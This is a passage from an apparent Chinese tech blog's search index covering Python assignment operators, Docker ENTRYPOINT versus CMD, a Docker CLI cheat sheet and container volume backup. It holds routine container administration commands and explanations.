class="comment"># 多个变量赋值</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>num1, num2, f1, str1 = <span class="number">100</span>, <span class="number">200</span>, <span class="number">3.14</span>, <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>num1</span><br><span class="line"><span class="number">100</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>num2</span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1</span><br><span class="line"><span class="number">3.14</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>str1</span><br><span class="line"><span class="string">&quot;hello&quot;</span></span><br></pre></td></tr></table></figure><h5 id="复合赋值运算符"><a href="#复合赋值运算符" class="headerlink" title="复合赋值运算符"></a>复合赋值运算符</h5><table><thead><tr><th align="left">运算符</th><th align="left">描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left"><code>+=</code></td><td align="left">加法赋值运算符</td><td align="left"><code>c += a</code> 等效于<code> c = c + a</code></td></tr><tr><td align="left"><code>-=</code></td><td align="left">减法赋值运算符</td><td align="left"><code>c -= a</code> 等效于<code> c = c - a</code></td></tr><tr><td align="left"><code>*=</code></td><td align="left">乘法赋值运算符</td><td align="left"><code>c *= a </code>等效于<code> c = c * a</code></td></tr><tr><td align="left"><code>/=</code></td><td align="left">除法赋值运算符</td><td align="left"><code>c /= a </code>等效于<code> c = c / a</code></td></tr><tr><td align="left"><code>%=</code></td><td align="left">取模赋值运算符</td><td align="left"><code>c %= a </code>等效于<code> c = c % a</code></td></tr><tr><td align="left"><code>**=</code></td><td align="left">幂赋值运算符</td><td align="left"><code>c **= a</code> 等效于<code> c = c ** a</code></td></tr><tr><td align="left"><code>//=</code></td><td align="left">取整除赋值运算符</td><td align="left"><code>c //= a </code>等效于 <code>c = c // a</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Python全栈 </category>
          
          <category> Python核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker - ENTRYPOINT指令详解</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Docker/Docker-ENTRYPOINT%E6%8C%87%E4%BB%A4%E8%AF%A6%E8%A7%A3.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Docker/Docker-ENTRYPOINT%E6%8C%87%E4%BB%A4%E8%AF%A6%E8%A7%A3.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="ENTRYPOINT"><a href="#ENTRYPOINT" class="headerlink" title="ENTRYPOINT"></a>ENTRYPOINT</h3><h4 id="两种写法"><a href="#两种写法" class="headerlink" title="两种写法"></a>两种写法</h4><pre><code># exec 格式ENTRYPOINT [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]# shell 格式ENTRYPOINT command param1 param2</code></pre><h4 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h4><ul><li>ENTRYPOINT 指定镜像的默认入口命令，该入口命令会在启动容器时作为根命令执行，所有其他传入值作为该命令的参数</li><li>ENTRYPOINT 的值可以通过<code>docker run --entrypoint</code>来覆盖掉</li><li>只有 Dockerfile 中的最后一条 ENTRYPOINT 指令会起作用</li></ul><h4 id="ENTRYPOINT-和-CMD-联合使用"><a href="#ENTRYPOINT-和-CMD-联合使用" class="headerlink" title="ENTRYPOINT 和 CMD 联合使用"></a>ENTRYPOINT 和 CMD 联合使用</h4><ul><li>当指定了 ENTRYPOINT 后，CMD 的含义就发生了改变，不再是直接的运行其命令，而是将 CMD 的内容作为参数传给 ENTRYPOINT 指令</li><li>换句话说实际执行时，会变成<code>&lt;ENTRYPOINT&gt; &quot;&lt;CMD&gt;&quot;</code></li></ul><h3 id="灵魂拷问"><a href="#灵魂拷问" class="headerlink" title="灵魂拷问"></a>灵魂拷问</h3><p>那么有了 CMD 后，为什么还要有 ENTRYPOINT 呢？这种<code>&lt;ENTRYPOINT&gt; &quot;&lt;CMD&gt;&quot;</code>有什么好处么？</p><h3 id="CMD-和-ENTRYPOINT-区别"><a href="#CMD-和-ENTRYPOINT-区别" class="headerlink" title="CMD 和 ENTRYPOINT 区别"></a>CMD 和 ENTRYPOINT 区别</h3><pre><code>CMD                   # 指定这个容器启动的时候要运行的命令，不可以追加命令ENTRYPOINT            # 指定这个容器启动的时候要运行的命令，可以追加命令</code></pre><p>啥意思？这其实也是 ENTRYPOINT 的应用场景之一，下面来看</p><h3 id="测试-CMD"><a href="#测试-CMD" class="headerlink" title="测试 CMD"></a>测试 CMD</h3><h4 id="编写-dockerfile-文件"><a href="#编写-dockerfile-文件" class="headerlink" title="编写 dockerfile 文件"></a>编写 dockerfile 文件</h4><pre><code>FROM centosCMD [&quot;ls&quot;,&quot;-a&quot;]    </code></pre><h4 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h4><pre><code>docker build -f CMD.dockerfile -t test .</code></pre><h4 id="运行容器"><a href="#运行容器" class="headerlink" title="运行容器"></a>运行容器</h4><pre><code>&gt; docker run test....dockerenvbindevetchomeliblib64lost+foundmediamntoptprocrootrunsbinsrvsystmpusrvar</code></pre><h4 id="运行容器并追加命令"><a href="#运行容器并追加命令" class="headerlink" title="运行容器并追加命令"></a>运行容器并追加命令</h4><pre><code>&gt; docker run test -ldocker: Error response from daemon: OCI runtime create failed: container_linux.go:380: starting container process caused: exec: &quot;-l&quot;: executable file not found in $PATH: unknown.</code></pre><ul><li>看到可执行文件找不到的报错，executable file not found</li><li>跟在镜像名后面的是 command，运行时会替换 CMD 的默认值，因此这里的 -l 替换了原来的 CMD，而不是追加在原来的 ls -a 后面</li><li>而 -l 根本不是命令，所以自然找不到</li></ul><h4 id="如果想加入-i-参数，必须重写-ls-命令"><a href="#如果想加入-i-参数，必须重写-ls-命令" class="headerlink" title="如果想加入 -i 参数，必须重写 ls 命令"></a>如果想加入 -i 参数，必须重写 ls 命令</h4><pre><code>&gt; docker run test ls -a -ltotal 56drwxr-xr-x   1 root root 4096 Oct 28 09:36 .drwxr-xr-x   1 root root 4096 Oct 28 09:36 ..-rwxr-xr-x   1 root root    0 Oct 28 09:36 .dockerenvlrwxrwxrwx   1 root root    7 Nov  3  2020 bin -&gt; usr/bindrwxr-xr-x   5 root root  340 Oct 28 09:36 devdrwxr-xr-x   1 root root 4096 Oct 28 09:36 etcdrwxr-xr-x   2 root root 4096 Nov  3  2020 homelrwxrwxrwx   1 root root    7 Nov  3  2020 lib -&gt; usr/liblrwxrwxrwx   1 root root    9 Nov  3  2020 lib64 -&gt; usr/lib64drwx------   2 root root 4096 Sep 15 14:17 lost+founddrwxr-xr-x   2 root root 4096 Nov  3  2020 mediadrwxr-xr-x   2 root root 4096 Nov  3  2020 mntdrwxr-xr-x   2 root root 4096 Nov  3  2020 optdr-xr-xr-x 221 root root    0 Oct 28 09:36 procdr-xr-x---   2 root root 4096 Sep 15 14:17 rootdrwxr-xr-x  11 root root 4096 Sep 15 14:17 runlrwxrwxrwx   1 root root    8 Nov  3  2020 sbin -&gt; usr/sbindrwxr-xr-x   2 root root 4096 Nov  3  2020 srvdr-xr-xr-x  13 root root    0 Oct 28 09:36 sysdrwxrwxrwt   7 root root 4096 Sep 15 14:17 tmpdrwxr-xr-x  12 root root 4096 Sep 15 14:17 usrdrwxr-xr-x  20 root root 4096 Sep 15 14:17 var</code></pre><p>可以了，但这明显不是最优选择，ENTRYPOINT 就可以解决这个问题</p><h3 id="测试-ENTRYPOINT"><a href="#测试-ENTRYPOINT" class="headerlink" title="测试 ENTRYPOINT"></a>测试 ENTRYPOINT</h3><h4 id="编写-dockerfile-文件-1"><a href="#编写-dockerfile-文件-1" class="headerlink" title="编写 dockerfile 文件"></a>编写 dockerfile 文件</h4><pre><code>FROM centosENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;]    </code></pre><h4 id="构建镜像-1"><a href="#构建镜像-1" class="headerlink" title="构建镜像"></a>构建镜像</h4><pre><code>docker build -f ENTRYPOINT.dockerfile -t test . </code></pre><h4 id="运行容器并追加命令-1"><a href="#运行容器并追加命令-1" class="headerlink" title="运行容器并追加命令"></a>运行容器并追加命令</h4><pre><code>&gt; docker run test -ltotal 56drwxr-xr-x   1 root root 4096 Oct 28 09:38 .drwxr-xr-x   1 root root 4096 Oct 28 09:38 ..-rwxr-xr-x   1 root root    0 Oct 28 09:38 .dockerenvlrwxrwxrwx   1 root root    7 Nov  3  2020 bin -&gt; usr/bindrwxr-xr-x   5 root root  340 Oct 28 09:38 devdrwxr-xr-x   1 root root 4096 Oct 28 09:38 etcdrwxr-xr-x   2 root root 4096 Nov  3  2020 homelrwxrwxrwx   1 root root    7 Nov  3  2020 lib -&gt; usr/liblrwxrwxrwx   1 root root    9 Nov  3  2020 lib64 -&gt; usr/lib64drwx------   2 root root 4096 Sep 15 14:17 lost+founddrwxr-xr-x   2 root root 4096 Nov  3  2020 mediadrwxr-xr-x   2 root root 4096 Nov  3  2020 mntdrwxr-xr-x   2 root root 4096 Nov  3  2020 optdr-xr-xr-x 207 root root    0 Oct 28 09:38 procdr-xr-x---   2 root root 4096 Sep 15 14:17 rootdrwxr-xr-x  11 root root 4096 Sep 15 14:17 runlrwxrwxrwx   1 root root    8 Nov  3  2020 sbin -&gt; usr/sbindrwxr-xr-x   2 root root 4096 Nov  3  2020 srvdr-xr-xr-x  13 root root    0 Oct 28 09:38 sysdrwxrwxrwt   7 root root 4096 Sep 15 14:17 tmpdrwxr-xr-x  12 root root 4096 Sep 15 14:17 usrdrwxr-xr-x  20 root root 4096 Sep 15 14:17 var</code></pre><h3 id="ENTRYPOINT-的第二个应用场景"><a href="#ENTRYPOINT-的第二个应用场景" class="headerlink" title="ENTRYPOINT 的第二个应用场景"></a>ENTRYPOINT 的第二个应用场景</h3><ul><li>启动容器就是启动主进程，但启动主进程前，可能需要一些准备工作，比如 mysql 可能需要一些数据库配置、初始化的工作，这些工作要在最终的 mysql 服务器运行之前解决</li><li>还可能希望避免使用 root 用户去启动服务，从而提高安全性，而在启动服务前还需要以 root 身份执行一些必要的准备工作，最后切换到服务用户身份启动服务</li><li>这些准备工作是和容器 CMD 无关的，无论 CMD 为什么，都需要事先进行一个预处理的工作，这种情况下，可以写一个脚本，然后放入 ENTRYPOINT 中去执行，而这个脚本会将接到的参数（也就是 &lt;CMD&gt;）作为命令，在脚本最后执行</li></ul><h4 id="官方镜像-redis"><a href="#官方镜像-redis" class="headerlink" title="官方镜像 redis"></a>官方镜像 redis</h4><pre><code>FROM alpine:3.4...RUN addgroup -S redis &amp;&amp; adduser -S -G redis redis...ENTRYPOINT [&quot;docker-entrypoint.sh&quot;]EXPOSE 6379CMD [ &quot;redis-server&quot; ]</code></pre><h4 id="docker-entrypoint-sh"><a href="#docker-entrypoint-sh" class="headerlink" title="docker-entrypoint.sh"></a>docker-entrypoint.sh</h4><pre><code>#!/bin/sh...# allow the container to be started with `--user`if [ &quot;$1&quot; = &#39;redis-server&#39; -a &quot;$(id -u)&quot; = &#39;0&#39; ]; then    find . \! -user redis -exec chown redis &#39;&#123;&#125;&#39; +    exec gosu redis &quot;$0&quot; &quot;$@&quot;fiexec &quot;$@&quot;</code></pre><p>该脚本的内容就是根据 CMD 的内容来判断，如果是 redis-server 的话，则切换到 redis 用户身份启动服务器，否则依旧使用 root 身份执行</p><pre><code>[root@poloyy ~]#  docker run -it redis iduid=0(root) gid=0(root) groups=0(root)# 直接进入容器内部[root@poloyy ~]#  docker run -it redisroot@565f89976d63:/#</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker - 常见命令</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Docker/Docker-%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Docker/Docker-%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Docker-备忘单"><a href="#Docker-备忘单" class="headerlink" title="Docker 备忘单"></a>Docker 备忘单</h1><p>原文：<a href="https://github.com/xcad2k/cheat-sheets/blob/main/infrastructure/docker/docker-cli.md">https://github.com/xcad2k/cheat-sheets/blob/main/infrastructure/docker/docker-cli.md</a></p><h2 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h2><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>docker create IMAGE</code></td><td>创建一个新容器</td></tr><tr><td><code>docker start CONTAINER</code></td><td>启动一个容器</td></tr><tr><td><code>docker stop CONTAINER</code></td><td>优雅地停止容器</td></tr><tr><td><code>docker kill CONTAINER</code></td><td>杀死（SIGKILL）一个容器</td></tr><tr><td><code>docker restart CONTAINER</code></td><td>优雅地停止和重启容器</td></tr><tr><td><code>docker pause CONTAINER</code></td><td>挂起一个容器</td></tr><tr><td><code>docker unpause CONTAINER</code></td><td>恢复一个容器</td></tr><tr><td><code>docker rm CONTAINER</code></td><td>销毁一个容器</td></tr></tbody></table><h2 id="容器批量管理"><a href="#容器批量管理" class="headerlink" title="容器批量管理"></a>容器批量管理</h2><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>docker stop $(docker ps -q)</code></td><td>停止所有正在运行的容器</td></tr><tr><td><code>docker stop $(docker ps -a -q)</code></td><td>停止所有已停止和正在运行的容器</td></tr><tr><td><code>docker kill $(docker ps -q)</code></td><td>杀死所有正在运行的容器</td></tr><tr><td><code>docker kill $(docker ps -a -q)</code></td><td>杀死所有停止和运行的容器</td></tr><tr><td><code>docker restart $(docker ps -q)</code></td><td>重新启动所有正在运行的容器</td></tr><tr><td><code>docker restart $(docker ps -a -q)</code></td><td>重新启动所有已停止和正在运行的容器</td></tr><tr><td><code>docker rm $(docker ps -q)</code></td><td>销毁所有正在运行的容器</td></tr><tr><td><code>docker rm $(docker ps -a -q)</code></td><td>销毁所有停止和运行的容器</td></tr><tr><td><code>docker pause $(docker ps -q)</code></td><td>暂停所有正在运行的容器</td></tr><tr><td><code>docker pause $(docker ps -a -q)</code></td><td>暂停所有已停止和正在运行的容器</td></tr><tr><td><code>docker start $(docker ps -q)</code></td><td>启动所有正在运行的容器</td></tr><tr><td><code>docker start $(docker ps -a -q)</code></td><td>启动所有已停止和正在运行的容器</td></tr><tr><td><code>docker rm -vf $(docker ps -a -q)</code></td><td>要删除所有容器，包括其卷，请使用</td></tr><tr><td><code>docker rmi -f $(docker images -a -q)</code></td><td>删除所有图像</td></tr><tr><td><code>docker system prune</code></td><td>删除所有悬空和未使用的图像、容器、缓存和卷</td></tr><tr><td><code>docker system prune -a</code></td><td>删除所有使用和未使用的图像</td></tr><tr><td><code>docker system prune --volumes</code></td><td>删除所有 docker 卷</td></tr></tbody></table><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>docker run IMAGE</code></td><td>启动一个新容器</td></tr><tr><td><code>docker run --name CONTAINER IMAGE</code></td><td>启动一个新容器并设置名称</td></tr><tr><td><code>docker run -p HOSTPORT:CONTAINERPORT IMAGE</code></td><td>使用映射端口启动一个新容器</td></tr><tr><td><code>docker run -P IMAGE</code></td><td>启动一个新容器并映射所有端口</td></tr></tbody></table><h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>docker ps</code></td><td>列出正在运行的容器</td></tr><tr><td><code>docker ps -a</code></td><td>列出所有正在运行的容器</td></tr><tr><td><code>docker logs CONTAINER</code></td><td>显示容器输出</td></tr><tr><td><code>docker logs -f CONTAINER</code></td><td>跟随容器输出</td></tr><tr><td><code>docker top CONTAINER</code></td><td>列出容器中运行的进程</td></tr><tr><td><code>docker diff</code></td><td>显示与图像的差异（修改后的文件）</td></tr><tr><td><code>docker inspect</code></td><td>显示容器信息（json 格式）</td></tr></tbody></table><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>docker attach CONTAINER</code></td><td>附加到容器</td></tr><tr><td><code>docker cp CONTAINER:PATH HOSTPATH</code></td><td>从容器中复制文件</td></tr><tr><td><code>docker cp HOSTPATH CONTAINER:PATH</code></td><td>将文件复制到容器中</td></tr><tr><td><code>docker export CONTAINER</code></td><td>导出容器的内容（tar 存档）</td></tr><tr><td><code>docker exec CONTAINER</code></td><td>在容器内运行命令</td></tr><tr><td><code>docker exec -it CONTAINER /bin/bash</code></td><td>在容器内打开交互式外壳</td></tr><tr><td><code>docker wait CONTAINER</code></td><td>等到容器终止并返回退出代码</td></tr></tbody></table><h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>docker images</code></td><td>列出所有本地镜像</td></tr><tr><td><code>docker history IMAGE</code></td><td>显示镜像历史</td></tr><tr><td><code>docker inspect IMAGE</code></td><td>显示信息（json格式）</td></tr><tr><td><code>docker tag IMAGE TAG</code></td><td>标记镜像</td></tr><tr><td><code>docker commit CONTAINER IMAGE</code></td><td>创建镜像（从容器）</td></tr><tr><td><code>docker import URL</code></td><td>创建镜像（来自 tarball）</td></tr><tr><td><code>docker rmi IMAGE</code></td><td>删除镜像</td></tr><tr><td><code>docker pull REPO:[TAG]</code></td><td>从注册表中提取镜像&#x2F;存储库</td></tr><tr><td><code>docker push REPO:[TAG]</code></td><td>推送和镜像&#x2F;存储库到注册表</td></tr><tr><td><code>docker search TEXT</code></td><td>在官方注册表中搜索镜像</td></tr><tr><td><code>docker login</code></td><td>登录到注册表</td></tr><tr><td><code>docker logout</code></td><td>从注册表注销</td></tr><tr><td><code>docker save REPO:[TAG]</code></td><td>将镜像&#x2F;存储库导出为 tarball</td></tr><tr><td><code>docker load</code></td><td>从 tarball 加载镜像</td></tr></tbody></table><h2 id="卷"><a href="#卷" class="headerlink" title="卷"></a>卷</h2><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>docker volumes</code></td><td>列出所有卷</td></tr><tr><td><code>docker volume create VOLUME</code></td><td>创建卷</td></tr><tr><td><code>docker volume inspect VOLUME</code></td><td>显示信息（json格式）</td></tr><tr><td><code>docker volume rm VOLUME</code></td><td>销毁卷</td></tr></tbody></table><h3 id="备份一个容器"><a href="#备份一个容器" class="headerlink" title="备份一个容器"></a>备份一个容器</h3><p>从容器卷中备份 docker 数据并将其打包进一个 tar文件。 <code>docker run --rm --volumes-from CONTAINER -v $(pwd):/backup busybox tar cvfz /backup/backup.tar CONTAINERPATH</code></p><h3 id="从备份中恢复容器"><a href="#从备份中恢复容器" class="headerlink" title="从备份中恢复容器"></a>从备份中恢复容器</h3><p>使用 tar文件恢复卷。 <code>docker run --rm --volumes-from CONTAINER -v $(pwd):/backup busybox bash -c &quot;cd CONTAINERPATH &amp;&amp; tar xvf /backup/backup.tar --strip 1&quot;</code></p><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h2 id="故障排除"><a href="#故障排除" class="headerlink" title="故障排除"></a>故障排除</h2><h3 id="联网"><a href="#联网" class="headerlink" title="联网"></a>联网</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name netshoot --rm -it nicolaka/netshoot /bin/bash</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具+环境 </category>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker - 对容器的数据卷进行备份</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Docker/Docker-%E5%AF%B9%E5%AE%B9%E5%99%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8D%B7%E8%BF%9B%E8%A1%8C%E5%A4%87%E4%BB%BD.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Docker/Docker-%E5%AF%B9%E5%AE%B9%E5%99%A8%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8D%B7%E8%BF%9B%E8%A1%8C%E5%A4%87%E4%BB%BD.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>关键字：</p><p><strong>数据卷容器</strong>，<strong>Docker容器的数据卷（data volume）</strong>，<strong>数据卷的备份和还原</strong></p></blockquote><h1 id="docker对容器的数据卷进行备份"><a href="#docker对容器的数据卷进行备份" class="headerlink" title="docker对容器的数据卷进行备份"></a>docker对容器的数据卷进行备份</h1><h2 id="基本知识，需要先了解！"><a href="#基本知识，需要先了解！" class="headerlink" title="基本知识，需要先了解！"></a>基本知识，需要先了解！</h2><blockquote><p>首先，我们得了解下面4个命令和数据卷容器的知识</p></blockquote><h3 id="打包数据命令"><a href="#打包数据命令" class="headerlink" title="打包数据命令"></a>打包数据命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -czvf /data/back.tar.gz /usr/</span><br></pre></td></tr></table></figure><h3 id="运行docker容器"><a href="#运行docker容器" class="headerlink" title="运行docker容器"></a>运行docker容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run dbdata</span><br></pre></td></tr></table></figure><h3 id="挂载数据卷容器中的数据卷"><a href="#挂载数据卷容器中的数据卷" class="headerlink" title="挂载数据卷容器中的数据卷"></a>挂载数据卷容器中的数据卷</h3><blockquote><p>这个地方在后面会细讲，关于容器中的数据卷</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --volumes-from dbdata centos</span><br><span class="line"><span class="comment"># 挂载数据卷容器名为dbdata到新的容器中 </span></span><br><span class="line"><span class="comment">#参数—volumes-from 后面接 数据卷容器id</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>数据卷容器</strong>：</p><p>命名的容器挂载数据卷，其他容器通过挂载这个容器实现数据共享，挂载数据卷的容器叫做数据卷容器。数据卷容器挂载了一个本地目录，其他容器连接这个容器来实现数据的共享（数据地址的拷贝）。</p><blockquote><p>顾名思义，就是从另一个容器当中挂载容器中已经创建好的数据卷。</p><p>如果你有一些持续更新的数据需要在容器之间共享，最好创建数据卷容器。</p><p><strong>数据卷容器</strong>，其实就是一个正常的容器，专门用来提供数据卷供其它容器挂载的。</p><p>注意这个名词：数据卷容器，并于后文容器的数据卷区分</p></blockquote></blockquote><h3 id="挂载主机中现有的目录当作数据卷"><a href="#挂载主机中现有的目录当作数据卷" class="headerlink" title="挂载主机中现有的目录当作数据卷"></a>挂载主机中现有的目录当作数据卷</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -v /webapps:/data centos</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把主机中/data目录挂载到窗口中的/webapps目录下</span></span><br></pre></td></tr></table></figure><h2 id="docker数据卷的备份！！！！"><a href="#docker数据卷的备份！！！！" class="headerlink" title="docker数据卷的备份！！！！"></a>docker数据卷的备份！！！！</h2><blockquote><p>这个地方在后面会细讲，关于容器中的数据卷</p></blockquote><blockquote><p>了解上面的4条命令后，我们就可以备份数据了，先知道怎么用就可以</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run --privileged=<span class="literal">true</span> --volumes-from dbdata -v /sb:/sb centos tar czvf /sb/backup.tar.gz /dbdata</span><br><span class="line">docker run --privileged=<span class="literal">true</span> --volumes-from 72660a186017 -v /sb:/sb mattrayner/lamp  tar czvf /sb/72660a186017.tar.gz /72660a186017</span><br></pre></td></tr></table></figure><blockquote><p>参数说明</p><ul><li><code>--privileged=true</code> 是为了避免访问目录权限不足的情况，这是由于selinux引起的。<strong>但是这个参数是一个很危险的参数，能少用就少用</strong></li><li><code>--volumes-from dbdata</code> 是挂载需要备份的数据卷容器名称，它就是一个容器。</li><li><code>-v /sb:/sb</code> 这是挂载主机目录到窗口中，第一个&#x2F;sb是代表着容器的目录，第二个&#x2F;sb是代表着主机的目录。</li><li><code>centos</code> 是代表着容器的REPOSITORY的ID，这个ID可以用docker images命令查看。</li><li><code>tar czvf /sb/backup.tar.gz /dbdata</code> 这部分放在后面，代表着容器启动成功后的命令。这部分就是对数据卷进行压缩，<code>/sb/backup.tar.gz</code> 这个目录是挂载的主机的目录，只要压缩到这个目录，那就相当于主机的目录也就有了相应的数据， <code>/dbdata</code>这个目录是挂载的数据卷容器中的目录，综合起来就是一组压缩命令，正好实现了把数据卷中的数据备份到当前主机中。</li></ul></blockquote><blockquote><p>思路：<a href="https://blog.csdn.net/geek_xiong/article/details/92030035">https://blog.csdn.net/geek_xiong/article/details/92030035</a></p></blockquote><h2 id="Docker容器的数据卷"><a href="#Docker容器的数据卷" class="headerlink" title="Docker容器的数据卷"></a>Docker容器的数据卷</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>数据卷就是数据(一个文件或者文件夹)。<br>Docker的理念之一是将应用与其运行的环境打包，docker容器的生命周期是与其运行的程序一致的，而对数据的要求是持久化，docker容器之间也需要有共享数据的渠道。</p><p>可以多个容器共用一个数据卷：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209272305209.png" alt="image-20220927230545065"></p></blockquote><h3 id="数据卷具有如下特点"><a href="#数据卷具有如下特点" class="headerlink" title="数据卷具有如下特点"></a>数据卷具有如下特点</h3><blockquote><ul><li>数据卷存在于宿主机中，数据卷设计的目的是数据的永久化，是完全独立于容器的生命周期，<strong>不会在容器删除时删除其挂载的数据卷，也不会存在类似垃圾收集机制，对容器引用的数据卷进行处理</strong>。可以在宿主机文件中找得到rm容器后遗留下来的数据卷！</li><li>数据卷<strong>可以是目录也可以是文件</strong>，容器可以利用数据卷与宿主机进行数据共享，实现了容器间的数据共享和交换。</li><li><strong>数据卷的变化不会影响镜像的更新</strong>。数据卷是独立于联合文件系统，镜像是基于联合文件系统。镜像与数据卷之间不会有相互影响。</li><li>容器对数据卷的修改是<strong>即时进行</strong>的。</li><li>容器启动的时候初始化的，如果容器使用的镜像包含了数据，这些数据也会拷贝到数据卷中。</li></ul></blockquote><h3 id="关于数据卷的操作"><a href="#关于数据卷的操作" class="headerlink" title="关于数据卷的操作"></a>关于数据卷的操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">为容器添加数据卷（数据存放的地址）：</span></span><br><span class="line">docker run -v ~/container_data:/data -it ubuntu /bin/bash </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">参数：</span></span><br><span class="line">-v指定数据卷在本机中的目录和在容器中映射的目录名。如果本机目录container_data不存在会创建，data 是容器中映射的目录。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看刚才创建的容器：</span></span><br><span class="line">docker ps</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可以看到Volumes信息和权限：</span></span><br><span class="line">docker inspect b78c81987d93</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">为数据卷添加权限：</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">sudo  docker  run  -it  -v  ~/datavolume:/data:ro  --name=bghd   ubuntu  /bin/bash</span> </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ro是只读, 在容器的data文件目录中就不能创建文件，因为是只读的。</span></span><br></pre></td></tr></table></figure><h3 id="Dockefifle使用数据卷"><a href="#Dockefifle使用数据卷" class="headerlink" title="Dockefifle使用数据卷"></a>Dockefifle使用数据卷</h3><blockquote><p>可以在dockerfile文件中加上<code>VOLUME[“/data”]</code>来创建含有数据卷的镜像并使用该镜像创建包含数据卷的容器。</p><p>Dockefifle可以创建多个数据卷，与在run命令中创建数据卷不同，dockerfile中的数据卷不能映射到已经存在的本地文件目录的，在镜像构建时指定的数据卷会在容器启动时创建指定名字的数据卷，运行同样镜像的容器创建的数据据是不一样的（可以看到不同容器的数据卷地址是不一样的）。当容器中的数据卷地址不一样时，容器之间就无法共享数据了。</p></blockquote><h3 id="关于挂载一个容器"><a href="#关于挂载一个容器" class="headerlink" title="关于挂载一个容器"></a>关于挂载一个容器</h3><blockquote><p>实际上就是用其数据卷，就相当于挂载了该容器的数据卷</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$docker run --volumes-from [container name] </span><br></pre></td></tr></table></figure><h4 id="先说结论"><a href="#先说结论" class="headerlink" 